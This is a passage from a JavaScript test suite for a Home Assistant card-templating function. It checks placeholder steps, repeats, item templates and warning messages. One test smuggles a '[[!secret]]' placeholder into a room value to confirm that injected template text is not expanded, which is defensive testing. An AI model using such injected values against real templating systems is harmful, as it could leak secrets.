  'if_exists reads the value the steps before it made',
  deepReplace(
    [{ room: 'Hall' }],
    {},
    { a: '[[room|lower|prefix:binary_sensor.|suffix:_motion|if_exists?]]', b: '[[room|prefix:light.|if_exists?]]' },
    undefined,
    known,
  ),
  { a: 'binary_sensor.hall_motion' },
);
{
  const said = [];
  const saved = console.warn;
  console.warn = (m) => said.push(m);
  const out = deepReplace(
    [{ attic: 'binary_sensor.attic_motion' }],
    {},
    { a: ['[[attic|if_exists?]]'], b: '[[attic|upper|lower|if_exists]]' },
    't',
    known,
  );
  console.warn = saved;
  check('an optional if_exists that finds nothing drops out without a warning', out, {
    b: '[[attic|upper|lower|if_exists]]',
  });
  check(
    'one that stays names the entity id it looked for',
    said.length === 1 && said[0].includes('"binary_sensor.attic_motion"'),
    true,
  );
}
check(
  'if_exists with no Home Assistant to ask is a gap, not a guess',
  deepReplace([{ m: 'binary_sensor.hall_motion' }], {}, { a: '[[m|if_exists|default:wait]]' }),
  { a: 'wait' },
);
check(
  'contains: finds text in text, and a whole item in a list',
  deepReplace(
    [{ name: 'Outdoor Lights' }, { tags: ['Outdoor', 'Garden'] }, { labels: 'Outdoors, Garden' }],
    {},
    {
      a: '[[name|contains:door]]',
      b: '[[tags|contains:Garden]]',
      c: '[[labels|split|contains:Outdoor]]',
      d: '[[missing|contains:x]]',
    },
  ),
  { a: true, b: true, c: false, d: false },
);
/* ------------------------- a mapping or a list through a fallback or a yes/no step */

{
  const vars = () => [{ m: { a: 1 } }, { l: ['a', 'b'] }, { e: 'light.x' }];
  const listHass = {
    states: { 'light.x': { state: 'on', attributes: { list_attr: [1, 2], obj_attr: { k: 'v' } } } },
    entities: {},
  };
  const run = (card) => deepReplace(vars(), {}, card, undefined, listHass);
  check(
    'default: and or: on a set mapping or list leave the value as a plain placeholder would',
    run({
      a: '[[m|default:x]]',
      b: '[[l|default:x]]',
      c: 'm=[[m|default:x]] l=[[l|or:e]]',
      d: '[[m|or:e]]',
      e: '[[l|default:x|join]]',
      f: '[[m]]',
      g: 'm=[[m]] l=[[l]]',
    }),
    {
      a: { a: 1 },
      b: ['a', 'b'],
      c: 'm={"a":1} l=["a","b"]',
      d: { a: 1 },
      e: 'a, b',
      f: { a: 1 },
      g: 'm={"a":1} l=["a","b"]',
    },
  );
  check(
    'contains: on a mapping asks whether it has that key',
    run({ a: '[[m|contains:a]]', b: '[[m|contains:b]]', c: '[[m|contains:object]]', d: 'has [[m|contains:a]]' }),
    { a: true, b: false, c: false, d: 'has true' },
  );
  check(
    'exists, or a text step before a fallback, leaves a mapping or list as written',
    run({ a: '[[m|exists]]', b: '[[l|exists]]', c: '[[m|upper|default:x]]', d: 'x [[l|slug|or:e]]' }),
    { a: '[[m|exists]]', b: '[[l|exists]]', c: '[[m|upper|default:x]]', d: 'x [[l|slug|or:e]]' },
  );
  check(
    'attr: joins a list attribute and writes a mapping attribute as its JSON',
    run({ a: '[[e|attr:list_attr]]', b: '[[e|attr:obj_attr]]' }),
    { a: '1, 2', b: '{"k":"v"}' },
  );
  check(
    'nothing puts [object Object] into a card',
    JSON.stringify(
      run({
        a: '[[m|default:x]]',
        b: 'in [[m|default:x]]',
        c: '[[m|or:e]]',
        d: '[[m|contains:object]]',
        e: '[[m|exists]]',
        f: 'in [[m|exists]]',
        g: '[[m|upper|default:x]]',
        h: '[[e|attr:obj_attr]]',
        i: '[[l|exists]]',
        j: '[[l|lower|default:x]]',
      }),
    ).includes('object Object'),
    false,
  );
}

check(
  'find: gives where the text starts as a number, -1 when it is not there',
  deepReplace([{ id: 'camera_1_car' }], {}, { a: '[[id|find:car]]', b: '[[id|find:dog]]', c: 'at [[id|find:_]]' }),
  { a: 9, b: -1, c: 'at 6' },
);

/* ------------------------------------- a value built from other placeholders */

{
  const hass = {
    states: {
      'light.hallway': { state: 'on', attributes: { friendly_name: 'Hallway light' } },
      'binary_sensor.hallway_motion': { state: 'off', attributes: {} },
    },
    entities: {},
  };
  check(
    'a resolver reads a let: value as it ends up, not with its brackets in',
    deepReplace(
      [{ room: 'Hallway' }],
      { let: { light: 'light.[[room|slug]]' } },
      { title: '[[light|friendly_name]]' },
      'x',
      hass,
      true,
    ),
    { title: 'Hallway light' },
  );
  check(
    'and a default: value',
    deepReplace(
      [{ room: 'hallway' }],
      { default: [{ light: 'light.[[room]]' }] },
      { title: '[[light|friendly_name]]' },
      'x',
      hass,
      true,
    ),
    { title: 'Hallway light' },
  );
  check(
    'exists asks about the entity a let: value builds',
    deepReplace(
      [{ room: 'hallway' }],
      { let: { m: 'binary_sensor.[[room]]_motion', has: '[[m|exists]]', none: '[[room|exists]]' } },
      { has: '[[has]]', none: '[[none]]' },
      'x',
      hass,
      true,
    ),
    { has: true, none: false },
  );
  check(
    'text from Home Assistant inside such a value stays text',
    deepReplace(
      [{ room: '[[!secret]]' }, { secret: 'leaked' }],
      { let: { label: 'Room [[room]]' } },
      { a: '[[label|upper]]' },
      'x',
      hass,
      true,
    ),
    { a: 'ROOM [[SECRET]]' },
  );
}

// `with:` and `repeat:` (#227): a body filled in again with values of its own, inside a
// card's own list or a longer string, once or once per item of a list or registry source.
{
  const hass227 = {
    states: {
      'light.a': { state: 'on', attributes: { friendly_name: 'Lamp A' } },
      'light.b': { state: 'off', attributes: { friendly_name: 'Lamp B' } },
      'sensor.t': { state: '21', attributes: { friendly_name: 'Temp' } },
    },
    entities: {
      'light.a': { entity_id: 'light.a', area_id: 'kitchen', platform: 'hue', labels: [] },
      'light.b': { entity_id: 'light.b', area_id: 'living', platform: 'hue', labels: [] },
      'sensor.t': { entity_id: 'sensor.t', area_id: 'kitchen', platform: 'template', labels: [] },
    },
    areas: {
      kitchen: { area_id: 'kitchen', name: 'Kitchen', floor_id: 'g' },
      living: { area_id: 'living', name: 'Living', floor_id: 'g' },
    },
    devices: {},
    floors: { g: { floor_id: 'g', name: 'Ground' } },
  };
  const vars = [
    { lights: { domain: 'light' } },
    { row: { entity: '[[entity]]', name: '[[name]]' } },
    { rowa: { entity: '[[entity]]', name: '[[name]] / [[area]]' } },
    { pos: '[[index]]/[[count]]' },
    { greeting: 'Hello [[who]], it is [[what]]' },
    { hello: { who: 'dstrohl', what: '[[when]]' } },
    { when: 'early' },
    { ids: ['light.a', 'light.b'] },
    { maps: [{ entity: 'sensor.t', name: 'T' }] },
    { self: 'x[[self|with:a=1]]' },
    { live_provider: 'ha' },
  ];
  const extras = {
    itemTemplates: {
      camera_entry: {
        default: { live_provider: 'go2rtc' },
        item: { camera_entity: '[[camera_entity]]', live_provider: '[[live_provider]]' },
      },
    },
  };
  const run = (content, v = vars, x = extras) =>
    deepReplace(v, {}, content, 'tpl', hass227, true, undefined, 0, undefined, undefined, false, x);

  // Bare `with` and `repeat` (#314).
  const own = {
    itemTemplates: {
      ...extras.itemTemplates,
      listed: { for_each: '[[list_in]]', item: { entity: '[[entity]]', name: '[[name]]' } },
      written: { for_each: [{ name: 'One' }, { name: 'Two' }], item: '[[name]] [[index]]/[[count]]' },
      found: { for_each_from: { domain: '[[search_domain]]' }, item: { entity: '[[entity]]' } },
      none: { item: '[[name]]' },
    },
  };
  check(
    'a bare with fills the body from the variables already there (#314)',
    run({ a: '[[row|with]]', b: '[[row|with:]]' }, [...vars, { entity: 'light.a' }, { name: 'Lamp' }]),
    { a: { entity: 'light.a', name: 'Lamp' }, b: { entity: 'light.a', name: 'Lamp' } },
  );
  check(
    "a bare repeat runs over the item template's own for_each, filled from the variables (#314)",
    run(
      { entities: ['[[listed|repeat]]', { type: 'divider' }], rows: '[[written|repeat]]' },
      [
        ...vars,
        {
          list_in: [
            { entity: 'light.a', name: 'A' },
            { entity: 'light.b', name: 'B' },
          ],
        },
      ],
      own,
    ),
    {
      entities: [{ entity: 'light.a', name: 'A' }, { entity: 'light.b', name: 'B' }, { type: 'divider' }],
      rows: ['One 1/2', 'Two 2/2'],
    },
  );
  check(
    "a bare repeat runs over the item template's own for_each_from (#314)",
    run({ entities: '[[found|repeat]]' }, [...vars, { search_domain: 'light' }], own),
    { entities: run({ e: '[[rowa|repeat:lights]]' }).e.map(({ entity }) => ({ entity })) },
  );
  check(
    'a bare repeat on a body with no source of its own is left showing',
    run({ a: '[[none|repeat]]', b: '[[row|repeat]]' }, vars, own),
    { a: '[[none|repeat]]', b: '[[row|repeat]]' },
  );
  check(
    'with: fills a mapping variable in with literal pairs',
    run({ entities: ['[[row|with:entity=light.a,name=Lamp]]'] }),
    {
      entities: [{ entity: 'light.a', name: 'Lamp' }],
    },
  );
  check(
    'with: an argument holding a placeholder of its own waits for it to be filled in',
    run({ entities: ['[[row|with:entity=light.[[which]],name=Lamp]]'] }, [...vars, { which: 'a' }]),
    { entities: [{ entity: 'light.a', name: 'Lamp' }] },
  );
  check('with: a mapping variable, whose own placeholders are filled in too', run({ x: '[[greeting|with:hello]]' }), {
    x: 'Hello dstrohl, it is early',
  });
  check('with: inside a longer string', run({ content: 'Say: [[greeting|with:who=John,what=late]]!' }), {
    content: 'Say: Hello John, it is late!',
  });
  check('repeat: over a list of mappings, as a whole value', run({ entities: '[[row|repeat:maps]]' }), {
    entities: [{ entity: 'sensor.t', name: 'T' }],
  });
  check('repeat: over a list of entity ids gives each copy its entity', run({ entities: '[[pos|repeat:ids]]' }), {
    entities: ['1/2', '2/2'],
  });
  check(
    'repeat: over a registry source, spliced into the list beside fixed entries',
    run({
      entities: ['[[rowa|with:entity=sun.sun,name=Sun,area=Sky]]', '[[rowa|repeat:lights]]', { type: 'divider' }],
    }),
    {
      entities: [
        { entity: 'sun.sun', name: 'Sun / Sky' },
        { entity: 'light.a', name: 'Lamp A / Kitchen' },
        { entity: 'light.b', name: 'Lamp B / Living' },
        { type: 'divider' },
      ],
    },
  );
  check('repeat: inside a longer string writes the list out as text', run({ content: 'x [[row|repeat:maps]]' }), {
    content: 'x [{"entity":"sensor.t","name":"T"}]',
  });
  check(
    'an item template: the with: values win, then the card, then its own default',
    run({
      cameras: [
        '[[camera_entry|with:camera_entity=camera.x]]',
        '[[camera_entry|with:camera_entity=camera.y,live_provider=image]]',
      ],
    }),
    {
      cameras: [
        { camera_entity: 'camera.x', live_provider: 'ha' },
        { camera_entity: 'camera.y', live_provider: 'image' },
      ],
    },
  );
  check(
    "an item template's own default fills what nothing else sets",
    run(
      { cameras: ['[[camera_entry|with:camera_entity=camera.x]]'] },
      vars.filter((v) => !('live_provider' in v)),
    ),
    { cameras: [{ camera_entity: 'camera.x', live_provider: 'go2rtc' }] },
  );
  check(
    'a bare item template name is its body, filled in from the card alone',
    run({ c: '[[camera_entry]]' }, [{ camera_entity: 'camera.z' }]),
    {
      c: { camera_entity: 'camera.z', live_provider: '[[live_provider]]' },
    },
  );
  check('a body that fills itself in is refused rather than looping', run({ content: '[[self|with:a=1]]' }), {
    content: '[[self|with:a=1]]',
  });
  check(
    'a repeat over nothing, a with: of a list, and a with: not first are all left visible',
    run({ content: 'a: [[row|repeat:nothere]] b: [[row|with:ids]] c: [[greeting|upper|with:who=a]]' }),
    { content: 'a: [[row|repeat:nothere]] b: [[row|with:ids]] c: [[greeting|upper|with:who=a]]' },
  );
  check(
    'without item templates handed in, a plain variable still works',
    run({ x: '[[row|with:entity=e,name=n]]' }, vars, undefined),
    {
      x: { entity: 'e', name: 'n' },
    },
  );
  // A with: or repeat: refusal says what went wrong in its own words, without the sentence
  // about text transforms, which has nothing to do with it.
  const said = [];
  console.warn = (m) => said.push(m);
  deepReplace(vars, {}, { content: '[[self|with:a=1]] [[row|repeat:nothere]] [[row|with:ids]]' }, 'tpl', hass227);
  console.warn = realWarn;
  check(
    'a with: or repeat: refusal is not explained as a transform needing a scalar',
    said.length > 0 &&
      said.every((m) => !/A transform only shapes text/.test(m)) &&
      said.some((m) => /fills itself/.test(m)),
    true,
  );
}

/* ------------------------- a value passed in its own right survives a lookup after or: */
{
  const sunHass = {
    states: { 'sun.sun': { entity_id: 'sun.sun', state: 'below_horizon', attributes: { friendly_name: 'Sun' } } },
    entities: {},
    devices: {},
    areas: {},
  };
  const named = {
    card: { type: 'tile', entity: '[[entity]]', name: '[[name|or:entity|friendly_name|default:Unnamed]]' },
  };
  const build = (vars) => deepReplace(vars, named, named.card, 't', sunHass, true).name;
  check('or: then a lookup: nothing passed gives the entity name', build([{ entity: 'sun.sun' }]), 'Sun');
  check(
    'or: then a lookup: a name passed is kept, not looked up',
    build([{ entity: 'sun.sun' }, { name: 'Shared name' }]),
    'Shared name',
  );
  check(
    "or: then a lookup: a copy's own name wins over the card's and is kept",
    build([{ entity: 'sun.sun', name: 'Overridden here' }, { name: 'Shared name' }]),
    'Overridden here',
  );
  check('or: then a lookup: nothing anywhere still reaches default:', build([{ entity: 'sun.nope' }]), 'Unnamed');
  const either = { card: { a: '[[entity|or:other|friendly_name]]' } };
  check(
    'or: then a lookup: an entity kept in its own right is still resolved',
    deepReplace([{ entity: 'sun.sun' }, { other: 'light.x' }], either, either.card, 't', sunHass, true).a,
    'Sun',
  );
  const after = { card: { a: '[[name|or:entity|friendly_name|default:Unnamed|upper]]' } };
  check(
    'and the steps after default: still shape whichever value it ends with',
    deepReplace([{ entity: 'sun.sun' }, { name: 'Shared name' }], after, after.card, 't', sunHass, true).a,
    'SHARED NAME',
  );
}

/* ------------------------------------------- or: stand-ins and deep reads (#235) */
{
  const hass235 = { states: { 'binary_sensor.porch_car': { state: 'off' } } };
  const vars = [
    { frigate: 'Porch' },
    { fr_name: '[[frigate|lower]]' },
    { ele: '[[zone|or:fr_name]]' },
    { calc: 'binary_sensor.[[ele]]_car' },
    { final: '[[nope|or:calc]]' },
    { there: '[[final|exists]]' },
  ];
  check(
    'an or: stand-in that brings placeholders in is finished before a step reads it',
    deepReplace(vars, {}, { e: '[[final]]', x: '[[there]]' }, 't', hass235, true),
    { e: 'binary_sensor.porch_car', x: true },
  );
  check(
    'and inside a value an if: reads',
    deepReplace([...vars, { shown: 'yes' }], {}, { a: '[[shown|if:there?]]' }, 't', hass235, true),
    { a: 'yes' },
  );

  const chain = (n) => {
    const v = [{ v0: 'no' }, { yes: 'yes' }, { x: 'X' }];
    for (let i = 1; i <= n; i += 1) v.push({ [`v${i}`]: `[[yes|if:v${i - 1}?]]` });
    return v;
  };
  check(
    'a chain of conditions six deep is read to the end',
    deepReplace(chain(6), {}, { a: '[[x|if:v6?]]' }, 't', undefined, true),
    {},
  );
  const warned = [];
  const warn = console.warn;
  console.warn = (message) => warned.push(message);
  deepReplace(chain(12), {}, { a: '[[x|if:v12?]]' }, 't', undefined, new Set());
  console.warn = warn;
  check(
    'past the limit it says so',
    warned.some((message) => message.includes('more than 8 deep')),
    true,
  );

  const extras = {
    itemTemplates: {
      inner: { item: { id: '[[entity]]', there: '[[there]]' } },
      outer: {
        default: [{ entity: 'binary_sensor.[[room]]_car' }, { there: '[[entity|exists]]' }],
        item: '[[inner|with:c=2]]',
      },
    },
  };
  const trace = newTrace235();
  deepReplace(
    [],
    {},
    { items: ['[[outer|with:room=porch]]'] },
    't',
    hass235,
    true,
    undefined,
    0,
    trace,
    undefined,
    false,
    extras,
  );
  const item = trace.items?.[0];
  check('a with: fill is traced on its own', item?.placeholder, '[[outer|with:room=porch]]');
  check('with its values as they ended up', Object.fromEntries(item?.trace.values ?? []), {
    room: 'porch',
    entity: 'binary_sensor.porch_car',
    there: true,
  });
  check('and the fill inside it under it', item?.trace.items?.[0]?.placeholder, '[[inner|with:c=2]]');
}

{
  const x = { itemTemplates: { opt: { default: [{ c: false }], item: '[[body|if:c?]]' } } };
  const run = (content, v) =>
    deepReplace(v, {}, content, 't', undefined, true, undefined, 0, undefined, undefined, false, x);
  check(
    'an optional with: whose fill comes out as nothing leaves its list (#235)',
    run({ l: ['[[opt|with:?]]', '[[opt|with:c=true?]]', 'k'] }, [{ body: { a: 1 } }]),
    { l: [{ a: 1 }, 'k'] },
  );
  check(
    'a with: mapping entry that names itself takes the value from outside',
    deepReplace(
      [{ there: 'yes' }, { data: { there: '[[there]]', n: 1 } }],
      {},
      { r: '[[row|with:data]]' },
      't',
      undefined,
      true,
      undefined,
      0,
      undefined,
      undefined,
      false,
      { itemTemplates: { row: { item: { t: '[[there]]', n: '[[n]]' } } } },
    ),
    { r: { t: 'yes', n: 1 } },
  );
}

{
  const hass = { states: { 'sensor.thing': {} } };
  const x = {
    itemTemplates: {
      t1: { default: [{ t_exists: '[[entity|exists]]' }], item: { entity: '[[entity]]' } },
      t2: { default: [{ probe: '[[t1|with:entity=sensor.[[n]]]]' }], item: '[[probe|if:probe.t_exists?]]' },
    },
  };
  const run = (v, content) =>
    deepReplace(v, {}, content, 't', hass, true, undefined, 0, undefined, undefined, false, x);
  check(
    'a variable holding a fill offers the fill’s own values by dotted name',
    run([{ a: '[[t1|with:entity=sensor.thing]]' }, { b: '[[t1|with:entity=sensor.nope]]' }], {
      x: '[[a.t_exists]]',
      y: '[[b.t_exists]]',
      z: '[[b|if:b.t_exists?]]',
      w: '[[a.unset]]',
    }),
    { x: true, y: false, w: '[[a.unset]]' },
  );
  check(
    'and inside an item template, its with: arguments filled in first, in a repeat too',
    run([{ ns: [{ n: 'thing' }, { n: 'nope' }] }], {
      l: ['[[t2|with:n=thing?]]', '[[t2|with:n=nope?]]', '[[t2|repeat:ns]]'],
    }),
    { l: [{ entity: 'sensor.thing' }, { entity: 'sensor.thing' }] },
  );
}

function newTrace235() {
  return { placeholders: new Map(), dropped: [], warnings: [] };
}

{
  const hass = { states: { 'sensor.thing': {} } };
  const x = {
    itemTemplates: {
      gated: { default: [{ t_exists: '[[entity|exists]]' }], item: '[[row|if:t_exists?]]' },
    },
  };
  check(
    'a repeat copy whose body dropped out leaves the list (#235)',
    deepReplace(
      [{ row: { e: '[[entity]]' } }, { ids: ['sensor.thing', 'sensor.nope'] }],
      {},
      { l: ['[[gated|repeat:ids]]'] },
      't',
      hass,
      true,
      undefined,
      0,
      undefined,
      undefined,
      false,
      x,
    ),
    { l: [{ e: 'sensor.thing' }] },
  );
}
// A repeat's registry source is filled in from the variables before it is looked up (#309).
{
  const hass = {
    states: {
      'binary_sensor.porch_car_occupancy': { state: 'on', attributes: { friendly_name: 'Porch car' } },
      'binary_sensor.porch_person_occupancy': { state: 'off', attributes: { friendly_name: 'Porch person' } },
      'light.a': { state: 'on', attributes: { friendly_name: 'Lamp A' } },
      'light.b': { state: 'on', attributes: { friendly_name: 'Lamp B' } },
    },
    entities: {
      'binary_sensor.porch_car_occupancy': { entity_id: 'binary_sensor.porch_car_occupancy', labels: [] },
      'binary_sensor.porch_person_occupancy': { entity_id: 'binary_sensor.porch_person_occupancy', labels: [] },
      'light.a': { entity_id: 'light.a', area_id: 'kitchen', labels: [] },
      'light.b': { entity_id: 'light.b', area_id: 'living', labels: [] },
    },
    areas: {
      kitchen: { area_id: 'kitchen', name: 'Kitchen' },
      living: { area_id: 'living', name: 'Living' },
    },
    devices: {},
  };
  const run = (vars, content) =>
    deepReplace(vars, {}, content, 't', hass, true, undefined, 0, undefined, undefined, false, {});
  check(
    'repeat: a registry source with placeholders in its filter (#309)',
    run(
      [
        { name: 'porch' },
        { kind: 'car' },
        { src: { entities: 'binary_sensor.[[name]]_[[kind]]_occupancy' } },
        { row: { entity: '[[entity]]' } },
      ],
      { rows: '[[row|repeat:src]]' },
    ),
    { rows: [{ entity: 'binary_sensor.porch_car_occupancy' }] },
  );
  check(
    'repeat: a registry source whose filter is a variable that is itself a placeholder (#309)',
    run(
      [
        { pattern: 'binary_sensor.[[name]]_*' },
        { name: 'porch' },
        { src: { entities: '[[pattern]]' } },
        { row: '[[entity]]' },
      ],
      { rows: '[[row|repeat:src]]' },
    ),
    { rows: ['binary_sensor.porch_car_occupancy', 'binary_sensor.porch_person_occupancy'] },
  );
  check(
    "repeat: inside another repeat's copy reads that copy's values in its source (#309)",
    run(
      [
        { rooms: [{ room: 'Kitchen' }, { room: 'Living' }] },
        { lights: { domain: 'light', area: '[[room]]' } },
        { section: { title: '[[room]]', rows: '[[row|repeat:lights]]' } },
        { row: '[[entity]]' },
      ],
      { sections: '[[section|repeat:rooms]]' },
    ),
    {
      sections: [
        { title: 'Kitchen', rows: ['light.a'] },
        { title: 'Living', rows: ['light.b'] },
      ],
    },
  );
  check(
    "a card's for_each_from is filled in from its variables and its template's defaults (#309)",
    fillSource(
      { entities: 'binary_sensor.[[name]]_[[kind]]_occupancy', exclude: ['[[skip]]'] },
      [{ name: 'porch' }, { skip: 'x' }],
      { default: [{ kind: 'car' }] },
      hass,
    ),
    { entities: 'binary_sensor.porch_car_occupancy', exclude: ['x'] },
  );
  const plain = { domain: 'light' };
  check(
    'a for_each_from with no placeholders is handed back as it was (#309)',
    fillSource(plain, [], {}, hass) === plain,
    true,
  );
}

/* ------------------------- console warnings say what actually went wrong */
{
  const said = [];
  const capture = (fn) => {
    said.length = 0;
    console.warn = (m) => said.push(m);
    const out = fn();
    console.warn = realWarn;
    return out;
  };

  check(
    'a map: no pair matches leaves the placeholder',
    capture(() => deepReplace([{ r: 'mid' }], {}, { c: '[[r|map:low=green,high=red]]' })),
    { c: '[[r|map:low=green,high=red]]' },
  );
  check(
    'and says no pair matched, suggesting *=, rather than blaming Home Assistant',
    said.length === 1 && /mid/.test(said[0]) && /\*=/.test(said[0]) && !/Home Assistant|resolver/.test(said[0]),
    true,
  );

  check(
    'a set variable with an unknown step is left as written',
    capture(() => deepReplace([{ room: 'Hall' }], {}, { n: '[[room|shout]]' })),
    { n: '[[room|shout]]' },
  );
  check(
    'and says the step is unknown, not that nothing gives the variable a value',
    said.length === 1 && /"shout" is not a step/.test(said[0]) && !/nothing gives a value/.test(said[0]),
    true,
  );
  capture(() => deepReplace([{ room: 'Hall' }], {}, { n: '[[room|Slug]]' }));
  check(
    'a misspelt step suggests the closest real one',
    said.length === 1 && /Did you mean "slug"/.test(said[0]),
    true,
  );
  capture(() => deepReplace([{ z: 'Z' }], {}, { n: '[[room|or:z|shout]]' }));
  check(
    'an unknown step on an unset variable with an or: is still the step',
    said.length === 1 && /"shout" is not a step/.test(said[0]),
    true,
  );
  capture(() => deepReplace([{ other: 1 }], {}, { n: '[[room|shout]]' }));
  check(
    'an unset variable is still reported as unset',
    said.length === 1 && /nothing gives a value/.test(said[0]),
    true,
  );
}

/* ------------------------------------------- button-card's [[[ ]]] is not a variable */

// `[[[ return ... ]]]` is button-card's JavaScript. The placeholder grammar reads its inside
// as `[[ return ... ]]`, which used to be reported as a variable nothing sets - both with a
// filled placeholder inside (the wiki's `[[name|json]]` pattern) and with none at all.
console.warn = (m) => warnings.push(m);
warnings.length = 0;
check(
  'button-card JavaScript quoting a name with json is filled',
  deepReplace([{ name: `O'Brien "x"` }], {}, { name: '[[[ return [[name|json]] ]]]' }),
  { name: `[[[ return "O'Brien \\"x\\"" ]]]` },
);
check('and says nothing about the JavaScript around it', warnings, []);

warnings.length = 0;
deepReplace([{ x: 1 }], {}, { name: '[[[ return entity.state ]]]', label: '[[[ if (x) return [a][0]; ]]]' });
check('button-card JavaScript with no placeholder in it is quiet', warnings, []);

const jsLeft = [];
deepReplace([{ x: 1 }], {}, { name: '[[[ return entity.state ]]]' }, undefined, undefined, true, (n) =>
  jsLeft.push(...n),
);
check('and is not handed on as unresolved (strict mode)', jsLeft, []);

warnings.length = 0;
deepReplace([{ x: 1 }], {}, { name: '[[[ return [[nope]] ]]]', label: "[[[ return '[[gone]]' ]]]" });
check(
  'an unset placeholder written inside the JavaScript is still reported',
  warnings.length === 1 &&
    /\[\[nope\]\]/.test(warnings[0]) &&
    /\[\[gone\]\]/.test(warnings[0]) &&
    !/return/.test(warnings[0]),
  true,
);
// A placeholder inside a text step's argument is filled in first, rather than the step
// stopping at its first ] and leaving `_[[type` as the argument.
check(
  'a placeholder inside a text step argument is filled in first',
  deepReplace(
    [{ camera: 'front', type: 'car', a: 'x[y', x: 'on', want: 'on' }],
    {},
    {
      s: '[[camera|prefix:binary_sensor.|suffix:_[[type]]_occupancy]]',
      r: '[[camera|replace:front:[[type]]]]',
      d: '[[nope|default:[[type]] park]]',
      i: '[[camera|if:x=[[want]]]]',
      b: '[[a|replace:[:(]]',
    },
  ),
  { s: 'binary_sensor.front_car_occupancy', r: 'car', d: 'car park', i: 'front', b: 'x(y' },
);

// A with: or repeat: naming no item template says that, not that a variable is unset (#349).
{
  const x = { itemTemplates: { camera_entry: { item: { entity: '[[camera]]' } } } };
  const build = (content, v = [{ camera: 'camera.front' }]) =>
    deepReplace(v, {}, content, 'tpl', undefined, false, undefined, 0, undefined, undefined, false, x);
  console.warn = (m) => warnings.push(m);
  warnings.length = 0;
  check(
    'a with: on a name with no item template is left as written (#349)',
    build({ row: '[[camera_entri|with:camera=camera.back]]', ok: '[[camera_entry|with:camera=camera.back]]' }),
    { row: '[[camera_entri|with:camera=camera.back]]', ok: { entity: 'camera.back' } },
  );
  check(
    'and says the item template is missing, not that nothing gives it a value (#349)',
    warnings.length === 1 &&
      /no item template called camera_entri here/.test(warnings[0]) &&
      !/nothing gives a value/.test(warnings[0]),
    true,
  );
  warnings.length = 0;
  build({ rows: ['[[nowhere|repeat:list]]'], name: '[[unset]]' }, [{ list: [1, 2] }]);
  check(
    'a repeat: is told apart the same way, and a plain unset name keeps its own warning (#349)',
    warnings.length === 2 &&
      warnings.some((m) => /no item template called nowhere here/.test(m) && !/\[\[unset\]\]/.test(m)) &&
      warnings.some((m) => /\[\[unset\]\], which nothing gives a value to/.test(m) && !/nowhere/.test(m)),
    true,
  );
  console.warn = realWarn;
}

console.warn = realWarn;
